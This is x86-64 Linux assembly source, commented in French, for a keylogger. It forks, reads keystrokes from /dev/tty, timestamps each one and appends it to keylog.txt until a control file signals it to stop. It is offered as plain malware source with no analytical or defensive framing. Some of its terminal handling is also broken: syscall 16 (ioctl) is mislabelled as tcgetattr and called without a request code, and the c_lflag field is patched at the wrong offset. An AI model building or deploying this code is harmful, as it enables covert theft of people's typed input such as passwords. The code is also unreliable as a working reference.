section .data
    fname db "keylog.txt", 0
    tty_path db "/dev/tty", 0   
    ctrl_file db "k.ctrl", 0     
    fd dq 0                    
    tty_fd dq 0                
    ctrl_fd dq 0               
    tbuf db 64 dup(0)          
    nl db 0xa                  
    s db " | ", 0              
    dpid dq 0                  

section .bss
    buf resb 1                 
    tspec resq 2               
    termios resb 60           ; struct termios

section .text
global _start

_start:
    mov rax, 57           
    syscall
    
    cmp rax, 0
    je child              
    mov [dpid], rax      
    jmp parent           

child:
    ; ouvre log
    mov rax, 2            
    mov rdi, fname
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall
    mov [fd], rax

    ; ouvre tty
    mov rax, 2
    mov rdi, tty_path
    mov rsi, 2           ; read-write
    mov rdx, 0
    syscall
    mov [tty_fd], rax

    ; get term settings
    mov rax, 16          ; tcgetattr
    mov rdi, [tty_fd]
    mov rsi, termios
    syscall

    ; desactive echo et canonical mode
    mov byte [termios+3], 0   ; c_lflag &= ~(ECHO | ICANON)

    ; set term settings
    mov rax, 16          ; tcsetattr (TCSANOW)
    mov rdi, [tty_fd]
    mov rsi, 2           ; TCSAFLUSH
    mov rdx, termios
    syscall

    ; init ctrl       
    mov rax, 2
    mov rdi, ctrl_file
    mov rsi, 102o
    mov rdx, 0644o
    syscall
    mov [ctrl_fd], rax

loop:
    ; verif ctrl
    mov rax, 3            
    mov rdi, [ctrl_fd]
    syscall

    mov rax, 2            
    mov rdi, ctrl_file
    mov rsi, 0            
    mov rdx, 0644o
    syscall
    mov [ctrl_fd], rax

    mov rax, 0
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    cmp rax, 1           
    je exit

    ; get time
    mov rax, 228         
    mov rdi, 0           
    mov rsi, tspec
    syscall

    ; lecture touche
    mov rax, 0                
    mov rdi, [tty_fd]                
    mov rsi, buf
    mov rdx, 1                
    syscall

    cmp rax, 0
    jle loop

    ; converti temps
    mov rax, [tspec]
    mov rdi, tbuf
    call ft

    ; ecrit temps
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, tbuf
    mov rdx, 20              
    syscall

    ; ecrit sep
    mov rax, 1
    mov rdi, [fd]
    mov rsi, s
    mov rdx, 3
    syscall

    ; ecrit touche
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    ; retour
    mov rax, 1
    mov rdi, [fd]
    mov rsi, nl
    mov rdx, 1
    syscall

    jmp loop

parent:
    mov rax, 2            
    mov rdi, ctrl_file
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall

    mov rax, 60              
    xor rdi, rdi
    syscall

exit:
    ; restore term settings
    mov byte [termios+3], 11  ; restore original c_lflag
    mov rax, 16               ; tcsetattr
    mov rdi, [tty_fd]
    mov rsi, 2                ; TCSAFLUSH
    mov rdx, termios
    syscall

    mov rax, 3                
    mov rdi, [fd]
    syscall

    mov rax, 3                
    mov rdi, [tty_fd]
    syscall

    mov rax, 3
    mov rdi, [ctrl_fd]
    syscall

    mov rax, 87               
    mov rdi, ctrl_file
    syscall

    mov rax, 60               
    xor rdi, rdi
    syscall

ft:
    push rbx
    push rcx
    
    mov rbx, 10             
    add rdi, 19             
    mov byte [rdi], 0       
    
    mov rcx, 19            
.l:
    dec rdi
    xor rdx, rdx
    div rbx
    add dl, '0'
    mov [rdi], dl
    dec rcx
    test rax, rax
    jnz .l
    
    pop rcx
    pop rbx
    ret